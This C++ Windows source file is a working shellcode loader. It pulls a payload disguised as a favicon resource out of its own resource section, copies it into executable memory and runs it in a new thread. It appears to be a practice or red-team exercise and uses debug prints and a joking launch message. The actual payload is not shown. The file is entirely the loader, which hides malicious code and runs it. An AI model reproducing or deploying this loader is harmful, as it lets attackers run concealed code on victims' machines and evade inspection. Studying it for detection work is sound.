#include <windows.h>
#include <iostream>
#include <cstdlib>
#include <cstring>
#include "resource.h"

int main()
{
    void* exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    HGLOBAL resHandle = NULL;
    HRSRC res;

    unsigned char* payload;
    unsigned int payload_len;

    //Extract payload from resources section
    res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    std::cout << res << "\n";
    resHandle = LoadResource(NULL, res);
    payload = static_cast<unsigned char*>(LockResource(resHandle));
    payload_len = SizeofResource(NULL, res);

    exec_mem = VirtualAlloc(0, payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    std::cout << "payload address: " << static_cast<void*>(payload) << std::endl;
    std::cout << "payload address: " << static_cast<void*>(exec_mem) << std::endl;

    RtlMoveMemory(exec_mem, payload, payload_len);

    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READWRITE, &oldprotect);

    std::cout << "Launch Nuclear Attack BOOM\n";
    std::cin.get();

    if (resHandle == NULL) {
        std::cout << "Failed to launch payload HANDLE\n";
        return -1;
    }

    if (rv != 0) {
        th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);
        WaitForSingleObject(th, INFINITE);
    } else if (rv == NULL) {
        std::cout << "Failed to launch payload\n";
        return -1;
    }

    std::cin.get();
}
